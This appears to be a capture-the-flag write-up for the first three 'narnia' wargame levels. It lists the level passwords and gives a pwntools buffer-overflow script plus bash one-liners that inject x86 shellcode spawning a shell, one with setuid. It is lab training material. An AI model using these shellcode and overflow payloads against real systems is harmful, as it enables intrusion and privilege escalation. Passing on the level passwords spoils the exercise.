
| LV        | Password     |
| --------- | ------------ |
| `narnia1` | `WDcYUTG5ul` |
| `narnia2` | `5agRAXeBdG` |
| `narnia3` | `2xszzNl6uG` |

## narnia0

Very simple buffer overflow!

```python
from pwn import *

p = process("/narnia/narnia0")

log.info(p.recv())
log.info("Sending payload...")

payload  = b'A' * 4 * 5
payload += p32(0xdeadbeef)

p.sendline(payload)

p.interactive()
```

## narnia1

Shellcode injection in env

```bash
echo -e "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80" > shellcode

export EGG=$(cat shellcode)

/narnia/narnia1
```

## narnia2

Shellcode injection with return address

These shellcode inject also a `setuid` 

```bash
/narnia/narnia2 $(echo -n -e "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x6a\x31\x58\x31\xd2\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80\x24\xd4\xff\xff\x24\xd4\xff\xff\x24\xd4\xff\xff\x24\xd4\xff\xff\x24\xd4\xff\xff\xa0\xd2\xff\xff\xa0\xd2\xff\xff\xa0\xd2\xff\xff\xa0\xd2\xff\xff")
```

